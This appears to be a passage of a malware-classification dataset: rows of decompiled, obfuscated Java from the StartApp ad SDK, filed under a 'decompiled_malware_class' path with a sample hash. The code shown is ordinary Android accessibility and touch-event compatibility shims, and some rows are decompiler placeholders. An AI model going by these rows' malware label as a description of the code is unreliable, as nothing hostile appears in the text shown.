View view,        AccessibilityEvent accessibilityEvent){           aVar.c(view,accessibilityEvent);         }         @Override public void d(        View view,        AccessibilityEvent accessibilityEvent){           aVar.a(view,accessibilityEvent);         }       } );     }     @Override public void a(    Object obj,    View view,    int i){       com.startapp.android.publish.slider.sliding.b.b.a(obj,view,i);     }     @Override public void a(    Object obj,    View view,    com.startapp.android.publish.slider.sliding.a.a aVar){       com.startapp.android.publish.slider.sliding.b.b.a(obj,view,aVar.a());     }     @Override public boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return com.startapp.android.publish.slider.sliding.b.b.a(obj,view,accessibilityEvent);     }     @Override public boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return com.startapp.android.publish.slider.sliding.b.b.a(obj,viewGroup,view,accessibilityEvent);     }     @Override public void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       com.startapp.android.publish.slider.sliding.b.b.b(obj,view,accessibilityEvent);     }     @Override public void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       com.startapp.android.publish.slider.sliding.b.b.c(obj,view,accessibilityEvent);     }     @Override public void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       com.startapp.android.publish.slider.sliding.b.b.d(obj,view,accessibilityEvent);     }   } public interface b {     com.startapp.android.publish.slider.sliding.a.d a(    Object obj,    View view);     Object a();     Object a(    a aVar);     void a(    Object obj,    View view,    int i);     void a(    Object obj,    View view,    com.startapp.android.publish.slider.sliding.a.a aVar);     boolean a(    Object obj,    View view,    int i,    Bundle bundle);     boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class c extends C0060a {     c(){     }     @Override public com.startapp.android.publish.slider.sliding.a.d a(    Object obj,    View view){       Object a=com.startapp.android.publish.slider.sliding.b.c.a(obj,view);       if (a != null) {         return new com.startapp.android.publish.slider.sliding.a.d(a);       }       return null;     }     @Override public Object a(    final a aVar){       return com.startapp.android.publish.slider.sliding.b.c.a(new c.a(){         @Override public Object a(        View view){           com.startapp.android.publish.slider.sliding.a.d b=aVar.b(view);           if (b != null) {             return b.a();           }           return null;         }         @Override public void a(        View view,        int i){           aVar.a(view,i);         }         @Override public void a(        View view,        Object obj){           aVar.a(view,new com.startapp.android.publish.slider.sliding.a.a(obj));         }         @Override public boolean a(        View view,        int i,        Bundle bundle){           return aVar.a(view,i,bundle);         }         @Override public boolean a(        View view,        AccessibilityEvent accessibilityEvent){           return aVar.b(view,accessibilityEvent);         }         @Override public boolean a(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return aVar.a(viewGroup,view,accessibilityEvent);         }         @Override public void b(        View view,        AccessibilityEvent accessibilityEvent){           aVar.d(view,accessibilityEvent);         }         @Override public void c(        View view,        AccessibilityEvent accessibilityEvent){           aVar.c(view,accessibilityEvent);         }         @Override public void d(        View view,        AccessibilityEvent accessibilityEvent){           aVar.a(view,accessibilityEvent);         }       } );     }     @Override public boolean a(    Object obj,    View view,    int i,    Bundle bundle){       return com.startapp.android.publish.slider.sliding.b.c.a(obj,view,i,bundle);     }   } static class d implements b {     d(){     }     @Override public com.startapp.android.publish.slider.sliding.a.d a(    Object obj,    View view){       return null;     }     @Override public Object a(){       return null;     }     @Override public Object a(    a aVar){       return null;     }     @Override public void a(    Object obj,    View view,    int i){     }     @Override public void a(    Object obj,    View view,    com.startapp.android.publish.slider.sliding.a.a aVar){     }     @Override public boolean a(    Object obj,    View view,    int i,    Bundle bundle){       return false;     }     @Override public boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return false;     }     @Override public boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return true;     }     @Override public void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       a=new c();     }  else     if (Build.VERSION.SDK_INT >= 14) {       a=new C0060a();     }  else {       a=new d();     }     c=a.a();   }   public Object a(){     return this.b;   }   public void a(  View view,  int i){     a.a(c,view,i);   }   public void a(  View view,  AccessibilityEvent accessibilityEvent){     a.d(c,view,accessibilityEvent);   }   public void a(  View view,  com.startapp.android.publish.slider.sliding.a.a aVar){     a.a(c,view,aVar);   }   public boolean a(  View view,  int i,  Bundle bundle){     return a.a(c,view,i,bundle);   }   public boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return a.a(c,viewGroup,view,accessibilityEvent);   }   public com.startapp.android.publish.slider.sliding.a.d b(  View view){     return a.a(c,view);   }   public boolean b(  View view,  AccessibilityEvent accessibilityEvent){     return a.a(c,view,accessibilityEvent);   }   public void c(  View view,  AccessibilityEvent accessibilityEvent){     a.c(c,view,accessibilityEvent);   }   public void d(  View view,  AccessibilityEvent accessibilityEvent){     a.b(c,view,accessibilityEvent);   } } public interface a {   void a(  View view,  int i);   void a(  View view,  Object obj);   boolean a(  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  View view,  AccessibilityEvent accessibilityEvent);   void c(  View view,  AccessibilityEvent accessibilityEvent);   void d(  View view,  AccessibilityEvent accessibilityEvent); } public interface a {   Object a(  View view);   void a(  View view,  int i);   void a(  View view,  Object obj);   boolean a(  View view,  int i,  Bundle bundle);   boolean a(  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  View view,  AccessibilityEvent accessibilityEvent);   void c(  View view,  AccessibilityEvent accessibilityEvent);   void d(  View view,  AccessibilityEvent accessibilityEvent); } interface a {   int a(  int i,  int i2); } static class a implements d {   a(){   }   @Override public void a(  KeyEvent keyEvent){   } } static class a implements c {   a(){   }   @Override public int a(  MotionEvent motionEvent){     return 1;   }   @Override public int a(  MotionEvent motionEvent,  int i){     return i == 0 ? 0 : -1;   }   @Override public int b(  MotionEvent motionEvent,  int i){     if (i == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float c(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float d(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   } } static class a implements c {   a(){   }   @Override public float a(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity();   }   @Override public float b(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getYVelocity();   } } static class a implements g {   a(){   }   long a(){     return 10L;   }   @Override public void a(  View view){     view.postInvalidateDelayed(a());   }   @Override public void a(  View view,  com.startapp.android.publish.slider.sliding.b.a aVar){   }   @Override public int b(  View view){     return 0;   }   @Override public ViewParent c(  View view){     return view.getParent();   } } static class a extends d {   a(){   }   @Override public void a(  ViewGroup viewGroup,  boolean z){     r.a(viewGroup,z);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\b.code","public interface b {   com.startapp.android.publish.slider.sliding.a.d a(  Object obj,  View view);   Object a();   Object a(  a aVar);   void a(  Object obj,  View view,  int i);   void a(  Object obj,  View view,  com.startapp.android.publish.slider.sliding.a.a aVar);   boolean a(  Object obj,  View view,  int i,  Bundle bundle);   boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } class b { public interface a {     void a(    View view,    int i);     void a(    View view,    Object obj);     boolean a(    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    View view,    AccessibilityEvent accessibilityEvent);     void c(    View view,    AccessibilityEvent accessibilityEvent);     void d(    View view,    AccessibilityEvent accessibilityEvent);   }   public static Object a(){     return new View.AccessibilityDelegate();   }   public static Object a(  final a aVar){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.b(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         a.this.a(view,accessibilityNodeInfo);       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.c(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(viewGroup,view,accessibilityEvent);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         a.this.a(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         a.this.d(view,accessibilityEvent);       }     } ;   }   public static void a(  Object obj,  View view,  int i){     ((View.AccessibilityDelegate)obj).sendAccessibilityEvent(view,i);   }   public static void a(  Object obj,  View view,  Object obj2){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityNodeInfo(view,(AccessibilityNodeInfo)obj2);   }   public static boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).dispatchPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);   }   public static void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityEvent(view,accessibilityEvent);   }   public static void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).sendAccessibilityEventUnchecked(view,accessibilityEvent);   } } static class b implements a {   b(){   }   @Override public int a(  int i,  int i2){     return (-8388609) & i;   } } static class b extends a {   b(){   }   @Override public void a(  KeyEvent keyEvent){     g.a(keyEvent);   } } static class b implements c {   b(){   }   @Override public int a(  MotionEvent motionEvent){     return i.a(motionEvent);   }   @Override public int a(  MotionEvent motionEvent,  int i){     return i.a(motionEvent,i);   }   @Override public int b(  MotionEvent motionEvent,  int i){     return i.b(motionEvent,i);   }   @Override public float c(  MotionEvent motionEvent,  int i){     return i.c(motionEvent,i);   }   @Override public float d(  MotionEvent motionEvent,  int i){     return i.d(motionEvent,i);   } } static class b implements c {   b(){   }   @Override public float a(  VelocityTracker velocityTracker,  int i){     return k.a(velocityTracker,i);   }   @Override public float b(  VelocityTracker velocityTracker,  int i){     return k.b(velocityTracker,i);   } } static class b extends a {   b(){   } } static class b extends a {   b(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\c.code","static class c extends C0060a {   c(){   }   @Override public com.startapp.android.publish.slider.sliding.a.d a(  Object obj,  View view){     Object a=com.startapp.android.publish.slider.sliding.b.c.a(obj,view);     if (a != null) {       return new com.startapp.android.publish.slider.sliding.a.d(a);     }     return null;   }   @Override public Object a(  final a aVar){     return com.startapp.android.publish.slider.sliding.b.c.a(new c.a(){       @Override public Object a(      View view){         com.startapp.android.publish.slider.sliding.a.d b=aVar.b(view);         if (b != null) {           return b.a();         }         return null;       }       @Override public void a(      View view,      int i){         aVar.a(view,i);       }       @Override public void a(      View view,      Object obj){         aVar.a(view,new com.startapp.android.publish.slider.sliding.a.a(obj));       }       @Override public boolean a(      View view,      int i,      Bundle bundle){         return aVar.a(view,i,bundle);       }       @Override public boolean a(      View view,      AccessibilityEvent accessibilityEvent){         return aVar.b(view,accessibilityEvent);       }       @Override public boolean a(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return aVar.a(viewGroup,view,accessibilityEvent);       }       @Override public void b(      View view,      AccessibilityEvent accessibilityEvent){         aVar.d(view,accessibilityEvent);       }       @Override public void c(      View view,      AccessibilityEvent accessibilityEvent){         aVar.c(view,accessibilityEvent);       }       @Override public void d(      View view,      AccessibilityEvent accessibilityEvent){         aVar.a(view,accessibilityEvent);       }     } );   }   @Override public boolean a(  Object obj,  View view,  int i,  Bundle bundle){     return com.startapp.android.publish.slider.sliding.b.c.a(obj,view,i,bundle);   } } class c { public interface a {     Object a(    View view);     void a(    View view,    int i);     void a(    View view,    Object obj);     boolean a(    View view,    int i,    Bundle bundle);     boolean a(    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    View view,    AccessibilityEvent accessibilityEvent);     void c(    View view,    AccessibilityEvent accessibilityEvent);     void d(    View view,    AccessibilityEvent accessibilityEvent);   }   public static Object a(  final a aVar){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(view,accessibilityEvent);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View view){         return (AccessibilityNodeProvider)a.this.a(view);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.b(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         a.this.a(view,accessibilityNodeInfo);       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.c(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(viewGroup,view,accessibilityEvent);       }       @Override public boolean performAccessibilityAction(      View view,      int i,      Bundle bundle){         return a.this.a(view,i,bundle);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         a.this.a(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         a.this.d(view,accessibilityEvent);       }     } ;   }   public static Object a(  Object obj,  View view){     return ((View.AccessibilityDelegate)obj).getAccessibilityNodeProvider(view);   }   public static boolean a(  Object obj,  View view,  int i,  Bundle bundle){     return ((View.AccessibilityDelegate)obj).performAccessibilityAction(view,i,bundle);   } } static class c implements a {   c(){   }   @Override public int a(  int i,  int i2){     return e.a(i,i2);   } } static class c extends b {   c(){   } } interface c {   int a(  MotionEvent motionEvent);   int a(  MotionEvent motionEvent,  int i);   int b(  MotionEvent motionEvent,  int i);   float c(  MotionEvent motionEvent,  int i);   float d(  MotionEvent motionEvent,  int i); } interface c {   float a(  VelocityTracker velocityTracker,  int i);   float b(  VelocityTracker velocityTracker,  int i); } static class c extends b {   c(){   }   @Override long a(){     return m.a();   } } interface c {   void a(  ViewGroup viewGroup,  boolean z); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\C0060a.code","static class C0060a extends d {   C0060a(){   }   @Override public Object a(){     return com.startapp.android.publish.slider.sliding.b.b.a();   }   @Override public Object a(  final a aVar){     return com.startapp.android.publish.slider.sliding.b.b.a(new b.a(){       @Override public void a(      View view,      int i){         aVar.a(view,i);       }       @Override public void a(      View view,      Object obj){         aVar.a(view,new com.startapp.android.publish.slider.sliding.a.a(obj));       }       @Override public boolean a(      View view,      AccessibilityEvent accessibilityEvent){         return aVar.b(view,accessibilityEvent);       }       @Override public boolean a(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return aVar.a(viewGroup,view,accessibilityEvent);       }       @Override public void b(      View view,      AccessibilityEvent accessibilityEvent){         aVar.d(view,accessibilityEvent);       }       @Override public void c(      View view,      AccessibilityEvent accessibilityEvent){         aVar.c(view,accessibilityEvent);       }       @Override public void d(      View view,      AccessibilityEvent accessibilityEvent){         aVar.a(view,accessibilityEvent);       }     } );   }   @Override public void a(  Object obj,  View view,  int i){     com.startapp.android.publish.slider.sliding.b.b.a(obj,view,i);   }   @Override public void a(  Object obj,  View view,  com.startapp.android.publish.slider.sliding.a.a aVar){     com.startapp.android.publish.slider.sliding.b.b.a(obj,view,aVar.a());   }   @Override public boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return com.startapp.android.publish.slider.sliding.b.b.a(obj,view,accessibilityEvent);   }   @Override public boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return com.startapp.android.publish.slider.sliding.b.b.a(obj,viewGroup,view,accessibilityEvent);   }   @Override public void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     com.startapp.android.publish.slider.sliding.b.b.b(obj,view,accessibilityEvent);   }   @Override public void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     com.startapp.android.publish.slider.sliding.b.b.c(obj,view,accessibilityEvent);   }   @Override public void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     com.startapp.android.publish.slider.sliding.b.b.d(obj,view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\d.code","static class d implements b {   d(){   }   @Override public com.startapp.android.publish.slider.sliding.a.d a(  Object obj,  View view){     return null;   }   @Override public Object a(){     return null;   }   @Override public Object a(  a aVar){     return null;   }   @Override public void a(  Object obj,  View view,  int i){   }   @Override public void a(  Object obj,  View view,  com.startapp.android.publish.slider.sliding.a.a aVar){   }   @Override public boolean a(  Object obj,  View view,  int i,  Bundle bundle){     return false;   }   @Override public boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return false;   }   @Override public boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return true;   }   @Override public void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   } } public class d {   static final a a; interface a {     int a(    int i,    int i2);   } static class b implements a {     b(){     }     @Override public int a(    int i,    int i2){       return (-8388609) & i;     }   } static class c implements a {     c(){     }     @Override public int a(    int i,    int i2){       return e.a(i,i2);     }   } static {     if (Build.VERSION.SDK_INT >= 17) {       a=new c();     }  else {       a=new b();     }   }   public static int a(  int i,  int i2){     return a.a(i,i2);   } } interface d {   void a(  KeyEvent keyEvent); } static class d extends c {   d(){   }   @Override public void a(  View view,  com.startapp.android.publish.slider.sliding.b.a aVar){     n.a(view,aVar.a());   } } static class d implements c {   d(){   }   @Override public void a(  ViewGroup viewGroup,  boolean z){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\e.code","class e {   public static int a(  int i,  int i2){     return Gravity.getAbsoluteGravity(i,i2);   } } static class e extends d {   e(){   }   @Override public void a(  View view){     o.a(view);   }   @Override public ViewParent c(  View view){     return o.b(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\f.code","public class f {   static final d a; static class a implements d {     a(){     }     @Override public void a(    KeyEvent keyEvent){     }   } static class b extends a {     b(){     }     @Override public void a(    KeyEvent keyEvent){       g.a(keyEvent);     }   } static class c extends b {     c(){     }   } interface d {     void a(    KeyEvent keyEvent);   } static {     if (Build.VERSION.SDK_INT >= 11) {       a=new c();     }  else {       a=new a();     }   }   public static void a(  KeyEvent keyEvent){     a.a(keyEvent);   } } static class f extends e {   f(){   }   @Override public int b(  View view){     return p.a(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\g.code","class g {   public static void a(  KeyEvent keyEvent){     keyEvent.startTracking();   } } interface g {   void a(  View view);   void a(  View view,  com.startapp.android.publish.slider.sliding.b.a aVar);   int b(  View view);   ViewParent c(  View view); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\h.code","public class h {   static final c a; static class a implements c {     a(){     }     @Override public int a(    MotionEvent motionEvent){       return 1;     }     @Override public int a(    MotionEvent motionEvent,    int i){       return i == 0 ? 0 : -1;     }     @Override public int b(    MotionEvent motionEvent,    int i){       if (i == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float c(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float d(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }   } static class b implements c {     b(){     }     @Override public int a(    MotionEvent motionEvent){       return i.a(motionEvent);     }     @Override public int a(    MotionEvent motionEvent,    int i){       return i.a(motionEvent,i);     }     @Override public int b(    MotionEvent motionEvent,    int i){       return i.b(motionEvent,i);     }     @Override public float c(    MotionEvent motionEvent,    int i){       return i.c(motionEvent,i);     }     @Override public float d(    MotionEvent motionEvent,    int i){       return i.d(motionEvent,i);     }   } interface c {     int a(    MotionEvent motionEvent);     int a(    MotionEvent motionEvent,    int i);     int b(    MotionEvent motionEvent,    int i);     float c(    MotionEvent motionEvent,    int i);     float d(    MotionEvent motionEvent,    int i);   } static {     if (Build.VERSION.SDK_INT >= 5) {       a=new b();     }  else {       a=new a();     }   }   public static int a(  MotionEvent motionEvent){     return motionEvent.getAction() & 255;   }   public static int a(  MotionEvent motionEvent,  int i){     return a.a(motionEvent,i);   }   public static int b(  MotionEvent motionEvent){     return (motionEvent.getAction() & android.support.v4.view.f.ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int b(  MotionEvent motionEvent,  int i){     return a.b(motionEvent,i);   }   public static float c(  MotionEvent motionEvent,  int i){     return a.c(motionEvent,i);   }   public static int c(  MotionEvent motionEvent){     return a.a(motionEvent);   }   public static float d(  MotionEvent motionEvent,  int i){     return a.d(motionEvent,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\i.code","class i {   public static int a(  MotionEvent motionEvent){     return motionEvent.getPointerCount();   }   public static int a(  MotionEvent motionEvent,  int i){     return motionEvent.findPointerIndex(i);   }   public static int b(  MotionEvent motionEvent,  int i){     return motionEvent.getPointerId(i);   }   public static float c(  MotionEvent motionEvent,  int i){     return motionEvent.getX(i);   }   public static float d(  MotionEvent motionEvent,  int i){     return motionEvent.getY(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\j.code","public class j {   static final c a; static class a implements c {     a(){     }     @Override public float a(    VelocityTracker velocityTracker,    int i){       return velocityTracker.getXVelocity();     }     @Override public float b(    VelocityTracker velocityTracker,    int i){       return velocityTracker.getYVelocity();     }   } static class b implements c {     b(){     }     @Override public float a(    VelocityTracker velocityTracker,    int i){       return k.a(velocityTracker,i);     }     @Override public float b(    VelocityTracker velocityTracker,    int i){       return k.b(velocityTracker,i);     }   } interface c {     float a(    VelocityTracker velocityTracker,    int i);     float b(    VelocityTracker velocityTracker,    int i);   } static {     if (Build.VERSION.SDK_INT >= 11) {       a=new b();     }  else {       a=new a();     }   }   public static float a(  VelocityTracker velocityTracker,  int i){     return a.a(velocityTracker,i);   }   public static float b(  VelocityTracker velocityTracker,  int i){     return a.b(velocityTracker,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\k.code","class k {   public static float a(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity(i);   }   public static float b(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getYVelocity(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\l.code","public class l {   static final g a; static class a implements g {     a(){     }     long a(){       return 10L;     }     @Override public void a(    View view){       view.postInvalidateDelayed(a());     }     @Override public void a(    View view,    com.startapp.android.publish.slider.sliding.b.a aVar){     }     @Override public int b(    View view){       return 0;     }     @Override public ViewParent c(    View view){       return view.getParent();     }   } static class b extends a {     b(){     }   } static class c extends b {     c(){     }     @Override long a(){       return m.a();     }   } static class d extends c {     d(){     }     @Override public void a(    View view,    com.startapp.android.publish.slider.sliding.b.a aVar){       n.a(view,aVar.a());     }   } static class e extends d {     e(){     }     @Override public void a(    View view){       o.a(view);     }     @Override public ViewParent c(    View view){       return o.b(view);     }   } static class f extends e {     f(){     }     @Override public int b(    View view){       return p.a(view);     }   } interface g {     void a(    View view);     void a(    View view,    com.startapp.android.publish.slider.sliding.b.a aVar);     int b(    View view);     ViewParent c(    View view);   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 17) {       a=new f();       return;     }     if (i >= 16) {       a=new e();       return;     }     if (i >= 14) {       a=new d();       return;     }     if (i >= 11) {       a=new c();     }  else     if (i >= 9) {       a=new b();     }  else {       a=new a();     }   }   public static void a(  View view){     a.a(view);   }   public static void a(  View view,  com.startapp.android.publish.slider.sliding.b.a aVar){     a.a(view,aVar);   }   public static int b(  View view){     return a.b(view);   }   public static ViewParent c(  View view){     return a.c(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\m.code","class m {   public static long a(){     return ValueAnimator.getFrameDelay();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\n.code","class n {   public static void a(  View view,  Object obj){     view.setAccessibilityDelegate((View.AccessibilityDelegate)obj);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\o.code","public class o {   public static void a(  View view){     view.postInvalidateOnAnimation();   }   public static ViewParent b(  View view){     return view.getParentForAccessibility();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\p.code","class p {   public static int a(  View view){     return view.getLayoutDirection();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\q.code","public class q {   static final c a; static class a extends d {     a(){     }     @Override public void a(    ViewGroup viewGroup,    boolean z){       r.a(viewGroup,z);     }   } static class b extends a {     b(){     }   } interface c {     void a(    ViewGroup viewGroup,    boolean z);   } static class d implements c {     d(){     }     @Override public void a(    ViewGroup viewGroup,    boolean z){     }   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 14) {       a=new b();     }  else     if (i >= 11) {       a=new a();     }  else {       a=new d();     }   }   public static void a(  ViewGroup viewGroup,  boolean z){     a.a(viewGroup,z);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\r.code","class r {   public static void a(  ViewGroup viewGroup,  boolean z){     viewGroup.setMotionEventSplittingEnabled(z);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.splash\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@45fbd650"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.splash\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@314d5ca3"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.splash\SplashConfig.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4bfbce4a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.splash\SplashHideListener.code","public interface SplashHideListener {   void splashHidden(); } "
